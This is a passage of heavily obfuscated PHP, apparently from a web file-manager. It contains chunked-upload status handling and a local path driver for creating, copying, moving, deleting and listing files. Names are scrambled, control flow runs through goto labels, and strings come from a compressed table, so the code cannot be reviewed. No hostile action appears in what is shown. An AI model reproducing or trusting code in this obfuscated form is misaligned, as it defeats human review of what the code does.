@fopen($CËÑéğºœŒ, $fŒÌ¬‡İï°[1518]); if (!$Eô½‰î²öë || !$F¢äÅ ®³ã || !$BµÑ¸İÇÒÔ) { CacheLock::unlock($BÚ‡ôì¹ëŒ); return !1; } while (!feof($Eô½‰î²öë)) { fwrite($F¢äÅ ®³ã, fread($Eô½‰î²öë, 1024 * 200)); } goto AƒàŒ­»Ş; D·›Üâò¦Å: return !0; goto d­Ø°×Ö; d­Ø°×Ö: } private function statusGet() { goto e«¬¹÷Ñ¥ß; BÖ²œ±ŒÔ: $E¯ºŞæŒ = !1; if (file_exists($fç ˜Áõß™)) { $E¯ºŞæŒ = @file_get_contents($fç ˜Áõß™); } if ($E¯ºŞæŒ) { $this->statusData = json_decode($E¯ºŞæŒ, !0); } goto a—Ù¤µÅÃ; e«¬¹÷Ñ¥ß: $C½ÏÛ†‡‡¨ =& $_SERVER[Æ]; if (is_array($this->statusData)) { return $this->statusData; } $fç ˜Áõß™ = $this->tempFile . $C½ÏÛ†‡‡¨[1989]; goto BÖ²œ±ŒÔ; a—Ù¤µÅÃ: if (!$this->statusData) { $eŠÀ‘’Çõ = array($C½ÏÛ†‡‡¨[28] => $this->fileName, $C½ÏÛ†‡‡¨[1976] => 0, $C½ÏÛ†‡‡¨[1977] => array()); $this->statusSet($eŠÀ‘’Çõ); } return $this->statusData; goto bØ¨»«ŠÕ¬; bØ¨»«ŠÕ¬: } public function statusSet($CŒÔìİòĞ™) { $aˆ¦Øâ…Õ = $this->tempFile . $_SERVER[Æ][1989]; if (!$CŒÔìİòĞ™) { if (file_exists($aˆ¦Øâ…Õ)) { @unlink($aˆ¦Øâ…Õ); } return !0; } $this->statusData = $CŒÔìİòĞ™; return file_put_contents($aˆ¦Øâ…Õ, json_encode($CŒÔìİòĞ™)); } private function initFileTemp() { $FÍÛòâÓ“» =& $_SERVER[Æ]; if (file_exists($this->tempFile)) { return; } $C–ƒø˜–ù = fopen($this->tempFile, $FÍÛòâÓ“»[1990]); fseek($C–ƒø˜–ù, $this->in[$FÍÛòâÓ“»[77]] - 1, SEEK_SET); fwrite($C–ƒø˜–ù, $FÍÛòâÓ“»[468]); fclose($C–ƒø˜–ù); } public function checkChunk() { goto b²¤ØÙ £Ú; b²¤ØÙ £Ú: $e°Íˆô¯²å =& $_SERVER[Æ]; $EäèóÅÜÑå = array(); CacheLock::lock($this->tempFile); goto e±•¿™…äˆ; FÁòŸœÖŞ: return $EäèóÅÜÑå; goto dñøÒ¢³‚­; e±•¿™…äˆ: $FÃ©»”ÈæØ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($FÃ©»”ÈæØ[$e°Íˆô¯²å[1977]] as $DÀÖ†ïğøŒ) { $a¦èÆ‚‹ˆ˜ = $DÀÖ†ïğøŒ[$e°Íˆô¯²å[164]]; if ($a¦èÆ‚‹ˆ˜) { $EäèóÅÜÑå[$e°Íˆô¯²å[1991] . $DÀÖ†ïğøŒ[$e°Íˆô¯²å[1036]]] = $a¦èÆ‚‹ˆ˜; } } goto FÁòŸœÖŞ; dñøÒ¢³‚­: } private function checkChunkHash($DˆìƒËïë) { goto D¼Óçƒ˜; b‹™å§ìˆ¦: $DâïˆÊß´ = _get($this->in, $f‰ƒñË¿‚“[1992]); if (strlen($DâïˆÊß´) == 32 && IO::hashSimple($this->tempFile) == $D„ç§´¡æ && IO::hashMd5($this->tempFile) == $DâïˆÊß´) { return !0; } $bË¨¿ğ¼ƒ¼ = fopen($this->tempFile, $f‰ƒñË¿‚“[1169]); goto DÕ¡´ô ·; DÕ¡´ô ·: $C’èÎ Â­ = !0; foreach ($DˆìƒËïë[$f‰ƒñË¿‚“[1977]] as $c“£ïŒáŸ) { fseek($bË¨¿ğ¼ƒ¼, $c“£ïŒáŸ[$f‰ƒñË¿‚“[1979]]); $dòË·ä›£ = PathDriverStream::hash($bË¨¿ğ¼ƒ¼, $c“£ïŒáŸ[$f‰ƒñË¿‚“[77]]); if ($c“£ïŒáŸ[$f‰ƒñË¿‚“[164]] != $dòË·ä›£) { $C’èÎ Â­ = !1; break; } } fclose($bË¨¿ğ¼ƒ¼); goto C´™Š…Ò«Ğ; C´™Š…Ò«Ğ: return $C’èÎ Â­; goto cÒ°Â†¨†; D¼Óçƒ˜: $f‰ƒñË¿‚“ =& $_SERVER[Æ]; if (count($DˆìƒËïë[$f‰ƒñË¿‚“[1977]]) != $DˆìƒËïë[$f‰ƒñË¿‚“[1976]]) { return !1; } $D„ç§´¡æ = _get($this->in, $f‰ƒñË¿‚“[1984]); goto b‹™å§ìˆ¦; cÒ°Â†¨†: } public static function fileName() { goto D¢‰†—õÑ³; d©¸Öì•Ğ: $Aº„ÏÑÛÇ = $Aº„ÏÑÛÇ ? $Aº„ÏÑÛÇ : time(); $Cøç›„˜°ƒ = strtolower($B„’Ì–ğÍ¶); if ($Cøç›„˜°ƒ == $a…¦ÆÃì£[1994] || $Cøç›„˜°ƒ == $a…¦ÆÃì£[1995]) { $B„’Ì–ğÍ¶ = date($a…¦ÆÃì£[688], $Aº„ÏÑÛÇ) . $a…¦ÆÃì£[70] . $in[$a…¦ÆÃì£[77]] . $a…¦ÆÃì£[1626]; } else { if ($Cøç›„˜°ƒ == $a…¦ÆÃì£[1996]) { $B„’Ì–ğÍ¶ = date($a…¦ÆÃì£[688], $Aº„ÏÑÛÇ) . $a…¦ÆÃì£[70] . $in[$a…¦ÆÃì£[77]] . $a…¦ÆÃì£[1997]; } } goto d¾îö”†; D¢‰†—õÑ³: $a…¦ÆÃì£ =& $_SERVER[Æ]; global $in; $B„’Ì–ğÍ¶ = isset($in[$a…¦ÆÃì£[28]]) ? $in[$a…¦ÆÃì£[28]] : $a…¦ÆÃì£[33]; goto C„øì–ƒ‡ñ; C„øì–ƒ‡ñ: if (!empty($_FILES)) { $B„’Ì–ğÍ¶ = $B„’Ì–ğÍ¶ ? $B„’Ì–ğÍ¶ : $_FILES[$a…¦ÆÃì£[167]][$a…¦ÆÃì£[386]]; } if (!is_wap()) { return KodIO::clear($B„’Ì–ğÍ¶); } $Aº„ÏÑÛÇ = strtotime($in[$a…¦ÆÃì£[1993]]); goto d©¸Öì•Ğ; d¾îö”†: return KodIO::clear($B„’Ì–ğÍ¶); goto d’½½òÙÎ; d’½½òÙÎ: } private function errorInfo($eÒñ¬ƒÓ¬¾) { $E’âªßùï =& $_SERVER[Æ]; $E…”Ì Ê× = array($E’âªßùï[1998], $E’âªßùï[1999], $E’âªßùï[2000], $E’âªßùï[2001], $E’âªßùï[2002], $E’âªßùï[2003], $E’âªßùï[2004], $E’âªßùï[2005]); return $eÒñ¬ƒÓ¬¾ . $E’âªßùï[4] . $E…”Ì Ê×[$eÒñ¬ƒÓ¬¾]; } } goto aê³öàéµŒ; eçë‘†áè: $a’åÍÙ‰áÒ = $_SERVER[Æ][547]; $_SERVER[í½¨] = explode($_SERVER[Æ][548], gzinflate(substr($_SERVER[Æ][549], 10, -8))); $Fë”†›ß©— = $_SERVER[Æ][550]; goto c’…õóÇ¼Ë; EÜøÅ¾Æ¯Ë: function beforeShutdownFatalError($e â‡ÖÒôÎ) { think_exception($e â‡ÖÒôÎ); } $_SERVER[$_SERVER[ş”][48]] = $B¶ùŞî‰Ó($_SERVER[$_SERVER[ş”][45]]); $eˆŞ¢ÅË¡† = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto F‘ó£«…É™; dµ·Š¾Ÿ‘: define($_SERVER[Æ][0], $_SERVER[Æ][1]); $_SERVER[ş”] = explode($_SERVER[Æ][2], gzinflate(substr($_SERVER[Æ][3], 10, -8))); function Model($bš˜ë´Äé = '', $FØ¤¦ë«óŒ = '', $bÖ˜Ğ‚°ß° = '') { goto B‹ùÜ‚Ü; cÔ«ŒéˆìÅ: if (isset($C¤Ûé£—å[$d§¦£¶‰µ])) { return $C¤Ûé£—å[$d§¦£¶‰µ]; } if ($bš˜ë´Äé) { $bš˜ë´Äé = strtoupper($bš˜ë´Äé[0]) . substr($bš˜ë´Äé, 1); $a¬ä‹™ø·Â = $bš˜ë´Äé . $a§­ÉµÆ¯[1]; if (class_exists($a¬ä‹™ø·Â)) { $C¤Ûé£—å[$d§¦£¶‰µ] = new $a¬ä‹™ø·Â(); return $C¤Ûé£—å[$d§¦£¶‰µ]; } } if (!$bÖ˜Ğ‚°ß°) { $bÖ˜Ğ‚°ß° = $GLOBALS[$a§­ÉµÆ¯[2]][$a§­ÉµÆ¯[3]]; } goto cˆÀÕº‰™; B‹ùÜ‚Ü: $a§­ÉµÆ¯ =& $_SERVER[ş”]; static $C¤Ûé£—å = array(); $d§¦£¶‰µ = strtolower($FØ¤¦ë«óŒ . $a§­ÉµÆ¯[0] . $bš˜ë´Äé); goto cÔ«ŒéˆìÅ; cˆÀÕº‰™: $C¤Ûé£—å[$d§¦£¶‰µ] = new ModelBase($bš˜ë´Äé, $FØ¤¦ë«óŒ, $bÖ˜Ğ‚°ß°); return $C¤Ûé£—å[$d§¦£¶‰µ]; goto aŸğ–‡œ”»; aŸğ–‡œ”»: } goto dÒ»™½–°‚; b—ÊóÍÀÜ‡: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($BÏ††÷£²±) { if (substr($BÏ††÷£²±, 0, 2) == $_SERVER[Æ][1154]) { $BÏ††÷£²± = BASIC_PATH . substr($BÏ††÷£²±, 2); } return $BÏ††÷£²±; } public function iconvApp($F…ï ç˜Ä) { $fÒ³Ù”´¶ =& $_SERVER[Æ]; global $config; return $this->iconvTo($F…ï ç˜Ä, $config[$fÒ³Ù”´¶[1152]], $config[$fÒ³Ù”´¶[1151]]); } public function iconvSystem($FåÔ×³ÍòŠ) { $FõÅÒ•ˆ³à =& $_SERVER[Æ]; global $config; return $this->iconvTo($FåÔ×³ÍòŠ, $config[$FõÅÒ•ˆ³à[1151]], $config[$FõÅÒ•ˆ³à[1152]]); } public function getPathOuter($d½ËÏº†Ğ”) { goto f×ìê”É³Œ; a¬»¨Çš°è: if (substr($EŠœÇ¦Ê‰Æ, 0, 2) == $E‹ùÜÚƒá[1154]) { $EŠœÇ¦Ê‰Æ = BASIC_PATH . substr($EŠœÇ¦Ê‰Æ, 2); } if (substr($d½ËÏº†Ğ”, 0, 2) == $E‹ùÜÚƒá[1154]) { $d½ËÏº†Ğ” = BASIC_PATH . substr($d½ËÏº†Ğ”, 2); } $EŠœÇ¦Ê‰Æ = KodIO::clear($EŠœÇ¦Ê‰Æ); goto fïÑ˜‡‰Ğµ; fïÑ˜‡‰Ğµ: $d½ËÏº†Ğ” = KodIO::clear($d½ËÏº†Ğ”); $d½ËÏº†Ğ” = substr($d½ËÏº†Ğ”, strlen($EŠœÇ¦Ê‰Æ)); if (empty($this->pathDriver)) { return $d½ËÏº†Ğ”; } goto b–¥Ü“ËÑ; f×ìê”É³Œ: $E‹ùÜÚƒá =& $_SERVER[Æ]; $EŠœÇ¦Ê‰Æ = $this->iconvApp($this->pathBase); $d½ËÏº†Ğ” = $this->iconvApp($d½ËÏº†Ğ”); goto a¬»¨Çš°è; b–¥Ü“ËÑ: return $this->pathDriver . $E‹ùÜÚƒá[8] . ltrim($d½ËÏº†Ğ”, $E‹ùÜÚƒá[8]); goto Bíˆ¬—ÁÆ´; Bíˆ¬—ÁÆ´: } public function mkfile($fƒ„Òº«…, $D»ÓÏ¯áÀ¿ = '', $DĞÜ¬ùéÏ = REPEAT_RENAME) { $fƒ„Òº«… = $this->iconvSystem($fƒ„Òº«…); @touch($fƒ„Òº«…); if ($D»ÓÏ¯áÀ¿) { file_put_contents($fƒ„Òº«…, $D»ÓÏ¯áÀ¿); } return is_file($fƒ„Òº«…) ? $this->getPathOuter($fƒ„Òº«…) : !1; } public function mkdir($e®òš¤¿ôè, $DÆ’ˆÅëíŒ = REPEAT_SKIP) { $e®òš¤¿ôè = $this->iconvSystem($e®òš¤¿ôè); if (is_dir($e®òš¤¿ôè)) { return $this->getPathOuter($e®òš¤¿ôè); } @mkdir($e®òš¤¿ôè, 511, !0); return is_dir($e®òš¤¿ôè) ? $this->getPathOuter($e®òš¤¿ôè) : !1; } public function copyFile($B‘¨•Âá†Î, $bŒ«æ–Ïãƒ) { $this->mkdir($this->pathFather($bŒ«æ–Ïãƒ)); $B‘¨•Âá†Î = $this->iconvSystem($B‘¨•Âá†Î); $bŒ«æ–Ïãƒ = $this->iconvSystem($bŒ«æ–Ïãƒ); $dçÂ•îæ¦ø = @copy($B‘¨•Âá†Î, $bŒ«æ–Ïãƒ); return $dçÂ•îæ¦ø ? $this->getPathOuter($bŒ«æ–Ïãƒ) : !1; } public function moveFile($dñŠ¡ÅË‰Û, $B‚á’Ò½øŠ) { $this->mkdir($this->pathFather($B‚á’Ò½øŠ)); $dñŠ¡ÅË‰Û = $this->iconvSystem($dñŠ¡ÅË‰Û); $B‚á’Ò½øŠ = $this->iconvSystem($B‚á’Ò½øŠ); $eÆÓ÷ÜˆÌ¯ = intval(@rename($dñŠ¡ÅË‰Û, $B‚á’Ò½øŠ)); if (!$eÆÓ÷ÜˆÌ¯) { if ($eÆÓ÷ÜˆÌ¯ = intval(@copy($dñŠ¡ÅË‰Û, $B‚á’Ò½øŠ))) { @unlink($dñŠ¡ÅË‰Û); } } return $eÆÓ÷ÜˆÌ¯ ? $this->getPathOuter($B‚á’Ò½øŠ) : !1; } public function delFile($eÊ…Ê‡Æœ) { $eÊ…Ê‡Æœ = $this->iconvSystem($eÊ…Ê‡Æœ); if (!@unlink($eÊ…Ê‡Æœ)) { @chmod($eÊ…Ê‡Æœ, 511); if (!@unlink($eÊ…Ê‡Æœ)) { return !1; } } else { return !0; } } public function delFolder($fœÊ³‰âÄ) { goto D³¨‡É³; FÍ‚‘Ğš½: return rmdir($fœÊ³‰âÄ); goto dÍë‘î‰ÜÕ; D³¨‡É³: $c„•¡ØÔçê =& $_SERVER[Æ]; $fœÊ³‰âÄ = $this->iconvSystem($fœÊ³‰âÄ); if (!is_dir($fœÊ³‰âÄ)) { return !0; } goto c¶Åàò¶ë; c¶Åàò¶ë: if (!($C‚ä£šÍöñ = opendir($fœÊ³‰âÄ))) { return !1; } while (($fÆÌö˜²‰ = readdir($C‚ä£šÍöñ)) !== !1) { if ($fÆÌö˜²‰ == $c„•¡ØÔçê[91] || $fÆÌö˜²‰ == $c„•¡ØÔçê[1164]) { continue; } $eÄîäÄÊÜî = $fœÊ³‰âÄ . $c„•¡ØÔçê[8] . $fÆÌö˜²‰; if (is_file($eÄîäÄÊÜî) || is_link($eÄîäÄÊÜî)) { if (!unlink($eÄîäÄÊÜî)) { chmod($eÄîäÄÊÜî, 511); if (!unlink($eÄîäÄÊÜî)) { return !1; } } } else { if (is_dir($eÄîäÄÊÜî)) { chmod($eÄîäÄÊÜî, 511); $eÄîäÄÊÜî = $this->iconvApp($eÄîäÄÊÜî); if (!$this->delFolder($eÄîäÄÊÜî)) { return !1; } } } } closedir($C‚ä£šÍöñ); goto FÍ‚‘Ğš½; dÍë‘î‰ÜÕ: } public function rename($EÀÃÊ°ˆ›İ, $A¿Æ°†šğŞ) { goto AÀÛÙ‚¬Õ; CªëŠ¦‹š: $EÀÃÊ°ˆ›İ = $this->iconvSystem($EÀÃÊ°ˆ›İ); $Bîâòë¦ê“ = $this->pathFather($EÀÃÊ°ˆ›İ); $fÌ¦ÆäÕÂã = rtrim($Bîâòë¦ê“, $FâƒéŠà[8]) . $FâƒéŠà[8] . $d‰Ñ’«òä“; goto cñËÏğ†„ˆ; cñËÏğ†„ˆ: $dòôìÙé˜Ğ = @rename($EÀÃÊ°ˆ›İ, $fÌ¦ÆäÕÂã); $fÌ¦ÆäÕÂã = $this->iconvApp($fÌ¦ÆäÕÂã); return $dòôìÙé˜Ğ ? $this->getPathOuter($fÌ¦ÆäÕÂã) : !1; goto aÉš»Ü¸Ôš; AÀÛÙ‚¬Õ: $FâƒéŠà =& $_SERVER[Æ]; $d‰Ñ’«òä“ = $this->fileNameAuto($this->pathFather($EÀÃÊ°ˆ›İ), $A¿Æ°†šğŞ); $d‰Ñ’«òä“ = $this->iconvSystem($d‰Ñ’«òä“); goto CªëŠ¦‹š; aÉš»Ü¸Ôš: } public function size($Fæïåéè—ä) { $Fæïåéè—ä = $this->iconvSystem($Fæïåéè—ä); return (double) abs(sprintf($_SERVER[Æ][1166], @filesize($Fæïåéè—ä))); } public function info($EÂêó­àœÃ) { $EÂêó­àœÃ = $this->iconvSystem($EÂêó­àœÃ); if ($this->isFolder($EÂêó­àœÃ)) { return $this->folderInfo($EÂêó­àœÃ); } else { if ($this->isFile($EÂêó­àœÃ)) { return $this->fileInfo($EÂêó­àœÃ); } } return !1; } protected function infoChildren($dêÚ°Çèğï, &$AŠá¼ĞåÓ°, $f…ò¿İ¶ÏÜ = true) { goto dÀ´È«İò; BĞ‹©Éî„Ÿ: if ($f…ò¿İ¶ÏÜ) { $dêÚ°Çèğï = $this->iconvSystem($dêÚ°Çèğï); } if (!($d×í…Ó‰øÈ = @opendir($dêÚ°Çèğï))) { return; } while (($EÁÈ¦™ = readdir($d×í…Ó‰øÈ)) !== !1) { if ($EÁÈ¦™ == $F±²Í¤ìÒÈ[91] || $EÁÈ¦™ == $F±²Í¤ìÒÈ[1164]) { continue; } $A¿À¡¡Õá° = $dêÚ°Çèğï . $EÁÈ¦™; if (is_file($A¿À¡¡Õá°) || is_link($A¿À¡¡Õá°)) { $AŠá¼ĞåÓ°[$F±²Í¤ìÒÈ[78]]++; $AŠá¼ĞåÓ°[$F±²Í¤ìÒÈ[77]] += (double) abs(sprintf($F±²Í¤ìÒÈ[1166], @filesize($A¿À¡¡Õá°))); } else { if (is_dir($A¿À¡¡Õá°)) { $AŠá¼ĞåÓ°[$F±²Í¤ìÒÈ[79]]++; $this->infoChildren($A¿À¡¡Õá°, $AŠá¼ĞåÓ°, !1); } } } goto dœ’¨²›¶´; dœ’¨²›¶´: closedir($d×í…Ó‰øÈ); goto E¿ •„™Ò‡; dÀ´È«İò: $F±²Í¤ìÒÈ =& $_SERVER[Æ]; check_abort(); $dêÚ°Çèğï = rtrim($dêÚ°Çèğï, $F±²Í¤ìÒÈ[8]) . $F±²Í¤ìÒÈ[8]; goto BĞ‹©Éî„Ÿ; E¿ •„™Ò‡: } private function folderInfo($D¦ªÌø´É, $bğ›×É„²° = false) { $c¡†‡ò¼¿ =& $_SERVER[Æ]; $D¦ªÌø´É = rtrim($D¦ªÌø´É, $c¡†‡ò¼¿[8]) . $c¡†‡ò¼¿[8]; $b»••æ¨‹› = $this->iconvApp($this->pathThis($D¦ªÌø´É)); if ($bğ›×É„²°) { return array($c¡†‡ò¼¿[28] => $b»••æ¨‹›, $c¡†‡ò¼¿[75] => $this->getPathOuter($D¦ªÌø´É), $c¡†‡ò¼¿[29] => $c¡†‡ò¼¿[76]); } $D©á·ÚÈğƒ = array($c¡†‡ò¼¿[28] => $b»••æ¨‹›, $c¡†‡ò¼¿[75] => $this->getPathOuter($D¦ªÌø´É), $c¡†‡ò¼¿[29] => $c¡†‡ò¼¿[76], $c¡†‡ò¼¿[187] => @filectime($D¦ªÌø´É), $c¡†‡ò¼¿[107] => @filemtime($D¦ªÌø´É), $c¡†‡ò¼¿[1167] => @fileatime($D¦ªÌø´É), $c¡†‡ò¼¿[1161] => is_readable($D¦ªÌø´É), $c¡†‡ò¼¿[1162] => is_writable($D¦ªÌø´É), $c¡†‡ò¼¿[1168] => get_mode($D¦ªÌø´É)); return $D©á·ÚÈğƒ; } private function fileInfo($aø™Í¢Úª°, $DÂ•Àé½Ë = false) { $fÒ“ôÂ¤šœ =& $_SERVER[Æ]; $a—åõ»…ô‹ = $this->iconvApp($this->pathThis($aø™Í¢Úª°)); if ($DÂ•Àé½Ë) { return array($fÒ“ôÂ¤šœ[28] => $a—åõ»…ô‹, $fÒ“ôÂ¤šœ[75] => $this->getPathOuter($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[29] => $fÒ“ôÂ¤šœ[167], $fÒ“ôÂ¤šœ[77] => $this->size($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[160] => $this->ext($a—åõ»…ô‹)); } $d¼Ë‚«œ« = array($fÒ“ôÂ¤šœ[28] => $a—åõ»…ô‹, $fÒ“ôÂ¤šœ[75] => $this->getPathOuter($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[29] => $fÒ“ôÂ¤šœ[167], $fÒ“ôÂ¤šœ[187] => @filectime($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[107] => @filemtime($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[1167] => @fileatime($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[77] => $this->size($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[160] => $this->ext($a—åõ»…ô‹), $fÒ“ôÂ¤šœ[1161] => is_readable($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[1162] => is_writable($aø™Í¢Úª°), $fÒ“ôÂ¤šœ[1168] => get_mode($aø™Í¢Úª°)); return $d¼Ë‚«œ«; } public function exist($D‰±Àâğ¾ó) { $D‰±Àâğ¾ó = $this->iconvSystem($D‰±Àâğ¾ó); return @file_exists($D‰±Àâğ¾ó); } public function isFile($BÏ—•ÛÔòÑ) { $BÏ—•ÛÔòÑ = $this->iconvSystem($BÏ—•ÛÔòÑ); return @is_file($BÏ—•ÛÔòÑ); } public function isFolder($D‘Æø“„œ”) { $D‘Æø“„œ” = $this->iconvSystem($D‘Æø“„œ”); return @is_dir($D‘Æø“„œ”); } public function listPath($FÖÜ²Ùİƒï, $EëğÔÃÑêŒ = false) { goto AÉ¨´¹°‰; AÉ¨´¹°‰: $Bˆñ¦‹çÚí =& $_SERVER[Æ]; $FÖÜ²Ùİƒï = $this->iconvSystem($FÖÜ²Ùİƒï); $FÖÜ²Ùİƒï = rtrim($FÖÜ²Ùİƒï, $Bˆñ¦‹çÚí[8]) . $Bˆñ¦‹çÚí[8]; goto AºŞ´ª‹†Ô; AºŞ´ª‹†Ô: $e¦ÔÇœŠŞ = array($Bˆñ¦‹çÚí[74] => array(), $Bˆñ¦‹çÚí[73] => array()); if (!($eÎ£¦¼°¹‡ = @opendir($FÖÜ²Ùİƒï))) { return $e¦ÔÇœŠŞ; } while (($DÛ½Ì¡ÕÂ = readdir($eÎ£¦¼°¹‡)) !== !1) { if ($DÛ½Ì¡ÕÂ == $Bˆñ¦‹çÚí[91] || $DÛ½Ì¡ÕÂ == $Bˆñ¦‹çÚí[1164]) { continue; } $FÀßíÏñ†ç = $FÖÜ²Ùİƒï . $DÛ½Ì¡ÕÂ; if (is_file($FÀßíÏñ†ç)) { $e¦ÔÇœŠŞ[$Bˆñ¦‹çÚí[73]][] = $this->fileInfo($FÀßíÏñ†ç, $EëğÔÃÑêŒ); } else { $e¦ÔÇœŠŞ[$Bˆñ¦‹çÚí[74]][] = $this->folderInfo($FÀßíÏñ†ç, $EëğÔÃÑêŒ); } } goto Aæá‹–ßŞ§; Aæá‹–ßŞ§: closedir($eÎ£¦¼°¹‡); return $e¦ÔÇœŠŞ; goto eá‘ÍØòß; eá‘ÍØòß: } public function listAll($c¼ïçÇøÛ, &$eÃª†°Ñ©à = array()) { goto Fï¾Øå¢Š; Fï¾Øå¢Š: $cÀê•¡¹¥ =& $_SERVER[Æ]; $c¼ïçÇøÛ = $this->iconvSystem($c¼ïçÇøÛ); $c¼ïçÇøÛ = rtrim($c¼ïçÇøÛ, $cÀê•¡¹¥[8]) . $cÀê•¡¹¥[8]; goto BøÜçºİÏ¬; BøÜçºİÏ¬: if (!($a®ˆ¹İ¯÷ = @opendir($c¼ïçÇøÛ))) { return $eÃª†°Ñ©à; } while (($FéØ†ç¦Ã = readdir($a®ˆ¹İ¯÷)) !== !1) { if ($FéØ†ç¦Ã == $cÀê•¡¹¥[91] || $FéØ†ç¦Ã == $cÀê•¡¹¥[1164]) { continue; } $eîîç§·Ø­ = $c¼ïçÇøÛ . $FéØ†ç¦Ã; if (is_dir($eîîç§·Ø­) && !is_link($eîîç§·Ø­)) { $eÃª†°Ñ©à[] = array($cÀê•¡¹¥[75] => $eîîç§·Ø­ . $cÀê•¡¹¥[8], $cÀê•¡¹¥[76] => 1, $cÀê•¡¹¥[107] => @filemtime($eîîç§·Ø­), $cÀê•¡¹¥[77] => 0); $this->listAll($eîîç§·Ø­, $eÃª†°Ñ©à); } else { $eÃª†°Ñ©à[] = array($cÀê•¡¹¥[75] => $eîîç§·Ø­, $cÀê•¡¹¥[76] => 0, $cÀê•¡¹¥[107] => @filemtime($eîîç§·Ø­), $cÀê•¡¹¥[77] => $this->size($eîîç§·Ø­)); } } closedir($a®ˆ¹İ¯÷); goto B‰‚Š‚³Ê; B‰‚Š‚³Ê: return $eÃª†°Ñ©à; goto aÀªˆÉ®—‰; aÀªˆÉ®—‰: } public function has($A®îÎ¾Ü·§, $AµŠ¿Õßº‰ = false, $FÛ‰Š»‰ª = true) { goto dÍ—¬£Á²„; c–Ææ–Ú‹: if (!($Béßœ…¢‹ = @opendir($A®îÎ¾Ü·§))) { return !1; } $a˜ôƒ£œ = 0; $Eî·‚™˜İ® = 0; goto dêÈŠ´¶Ò; dÍ—¬£Á²„: $a¼ùŒŒùİ =& $_SERVER[Æ]; $A®îÎ¾Ü·§ = $this->iconvSystem($A®îÎ¾Ü·§); $A®îÎ¾Ü·§ = rtrim($A®îÎ¾Ü·§, $a¼ùŒŒùİ[8]) . $a¼ùŒŒùİ[8]; goto c–Ææ–Ú‹; dêÈŠ´¶Ò: $aÏÎ÷óÏ®´ = 0; while (($CƒË™Ò«¿Ï = readdir($Béßœ…¢‹)) !== !1) { if ($CƒË™Ò«¿Ï == $a¼ùŒŒùİ[91] || $CƒË™Ò«¿Ï == $a¼ùŒŒùİ[1164]) { continue; } $aĞñãè„‰“ = $A®îÎ¾Ü·§ . $CƒË™Ò«¿Ï; if ($AµŠ¿Õßº‰) { $aÏÎ÷óÏ®´++; if (@is_file($aĞñãè„‰“)) { $a˜ôƒ£œ++; } else { $Eî·‚™˜İ®++; } if ($aÏÎ÷óÏ®´ > 10000) { break; } continue; } if ($FÛ‰Š»‰ª) { if (@is_file($aĞñãè„‰“)) { return !0; } } else { if (@is_dir($aĞñãè„‰“ . $a¼ùŒŒùİ[8])) { return !0; } } } closedir($Béßœ…¢‹); goto DÃÁ§ÌÊ™Û; DÃÁ§ÌÊ™Û: if ($AµŠ¿Õßº‰) { return array($a¼ùŒŒùİ[191] => $a˜ôƒ£œ, $a¼ùŒŒùİ[192] => $Eî·‚™˜İ®); } return !1; goto EºÑÇÌœ°š; EºÑÇÌœ°š: } public function hashSimple($cÌ­´‚ËĞÆ) { goto F„ƒĞÂ»º; F„ƒĞÂ»º: $B®‘Ğî÷èù =& $_SERVER[Æ]; if (!$cÌ­´‚ËĞÆ) { return md5($B®‘Ğî÷èù[33]); } $cÌ­´‚ËĞÆ = $this->iconvSystem($cÌ­´‚ËĞÆ); goto bƒÛ®ª¯èÀ; C«Ì×ˆó‹Ø: return md5($f“Ş«ÛÁæ•) . $c‰‚‘; goto bÕÙèã‘÷Ï; FÆ° ø•: if ($c‰‚‘ <= $DŞœ­öäœ¯ * $Cø‡äİÌ¥‘) { return $this->hashMd5($cÌ­´‚ËĞÆ) . $c‰‚‘; } $f“Ş«ÛÁæ• = $B®‘Ğî÷èù[33]; $e‘“ï‰£¬ = intval($c‰‚‘ / $Cø‡äİÌ¥‘); goto døÎ…ªñ‹¡; bƒÛ®ª¯èÀ: $c‰‚‘ = $this->size($cÌ­´‚ËĞÆ); $DŞœ­öäœ¯ = 200; $Cø‡äİÌ¥‘ = 50; goto FÆ° ø•; e„¾´§´Ëø: fseek($d¹å†Œ®É…, $c‰‚‘ - $DŞœ­öäœ¯); $f“Ş«ÛÁæ• .= fread($d¹å†Œ®É…, $DŞœ­öäœ¯); fclose($d¹å†Œ®É…); goto C«Ì×ˆó‹Ø; døÎ…ªñ‹¡: $d¹å†Œ®É… = fopen($cÌ­´‚ËĞÆ, $B®‘Ğî÷èù[1169]); if (!$d¹å†Œ®É…) { return $f“Ş«ÛÁæ•; } for ($aÎ¶œŸŞ»í = 0; $aÎ¶œŸŞ»í < $Cø‡äİÌ¥‘; $aÎ¶œŸŞ»í++) { fseek($d¹å†Œ®É…, $e‘“ï‰£¬ * $aÎ¶œŸŞ»í); $f“Ş«ÛÁæ• .= fread($d¹å†Œ®É…, $DŞœ­öäœ¯); } goto e„¾´§´Ëø; bÕÙèã‘÷Ï: } public function getContent($a‡Î¨ª‘ğ¦) { $a‡Î¨ª‘ğ¦ = $this->iconvSystem($a‡Î¨ª‘ğ¦); return file_get_contents($a‡Î¨ª‘ğ¦); } public function setContent($A¬Óß¾¹Ãä, $bášøöğ‹ = '') { $A¬Óß¾¹Ãä = $this->iconvSystem($A¬Óß¾¹Ãä); @file_put_contents($A¬Óß¾¹Ãä, $bášøöğ‹, LOCK_EX); clearstatcache(); return strlen($bášøöğ‹) == filesize($A¬Óß¾¹Ãä); } public function fileSubstr($c´™í¯»¹µ, $A¬ñªï¨İ© = 0, $EÈ«“Šì× = false) { goto DÈç’ãÄ¸; DÈç’ãÄ¸: $f”¦•˜èÕ¯ =& $_SERVER[Æ]; $c´™í¯»¹µ = $this->iconvSystem($c´™í¯»¹µ); if ($EÈ«“Šì× === !1) { $EÈ«“Šì× = $this->size($c´™í¯»¹µ); } goto F²¼„¬‘“; BÇÂñëóíÈ: fseek($d¦ÁŠÌª¤Ó, $A¬ñªï¨İ©); $CôåÓ‹¶çÖ = fread($d¦ÁŠÌª¤Ó, $EÈ«“Šì×); fclose($d¦ÁŠÌª¤Ó); goto dˆ‚¦ëç™œ; F²¼„¬‘“: if ($EÈ«“Šì× <= 0) { return 